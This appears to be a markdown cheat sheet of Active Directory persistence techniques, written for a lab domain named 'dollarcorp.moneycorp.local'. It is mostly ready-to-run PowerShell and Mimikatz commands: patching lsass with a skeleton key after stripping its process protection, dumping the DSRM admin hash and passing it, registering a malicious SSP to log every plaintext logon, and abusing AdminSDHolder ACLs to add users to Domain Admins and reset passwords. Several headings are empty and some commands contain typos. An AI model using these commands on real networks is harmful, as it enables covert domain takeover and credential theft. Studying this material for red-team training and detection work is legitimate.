## Persistence on Active Directory 

### Golden Ticket



### Silver Ticket


### Skeleton Key
```powershell
# Patch a DC `lsass` process allowing to use any user with single password. DA privileges are required.
C:> Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>

# Now can access any host in the domain with any user with password `mimikatz`
C:> Enter-PSSession -Computername <host> -Credential <domain>\<username>
```
```powershell
# If lsass is running proected, need to use mimikatz driver
mimikatz # privilege::debug
mimikatz # !+
mimikatz # !processprotect process:lsass.exe /remove
mimikatz # misc ::skeleton
mimikatz # !

```
### DSRM (Directory Services Restore Mode)
- There is a local admin on every DC called `Administrator` whose passwd is the DSRM passwd
```powershell
1. Dump DSRM password (DA privileges required)
C:> Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -Computername <hostname>

2. Compare the Administrator hash with the Admin hash of this command
C:> Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <hostname>

3. First one is the DSRM local Admin. Pass the hash can be used to authenticate
4. Logon behavior for DSRM account needs to be changed
C:> Enter-PSSession -Computername <hostname> 
C:> New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

5. PAss the hash
C:> Invoke-Mimikatz -Command '"sekurlsa::pth /domain:<domain> /user:Administrator /ntlm:<adim_hash> /run:powershell.exe
```
### SSP (Security Support Provider)
- Inject into `lsass` using Mimikatz
```powershell
C:> Invoke-Mimikatz -Command '"misc::memssp"'
```
- Use `mimilib.dll`
```powershell
C:> $packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' | select -ExpandProperty 'Security Packages'
C:> $packages += mimilib
C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
C:> Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```
- All logons on DC logged to `C:\Windows\system32\kiwissp.log`

### SDPROP and AdminSDHolder
- `sdprop` is a process that runs evey hour and compares ACL of protected groups with members of the ACL of `AdminSDHolder`. Any differences are overwriten.
- With DA privileges on `AdminSDHolder` object, a user can be added to the `AsminSDHolder` ACL and will be added to protected groups when `sdprop` runs
```powershell
C:> . .\Invoke-SDPropagator.ps1

# Force `sdprop` to run
C:> Invoke-SDPropagator

# Add Full Control Permissions for a user to AdminSDHolder using PowerView
C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc moneycorp,dc=local' -PrincipalIdentity <username> -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Add Change PAssword permissions
C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity <username> -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Add Write Members
C:> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity <username> -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose

# Check Domain Admins Permissions with Poweriew
C:> Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "<username>"}

# Once with permissions, Add User with PowerView
C:> Add-DomainGroupMember -Identity 'Domain Admins' .Members <username> -Verbose

# Change user password
C:> Set-DomainUserPassword -Identity <usernname> -AccountPassword (ConvertTo-SecureString "Password@" -AsPlainText -Force) -Verbose
```

### MORE





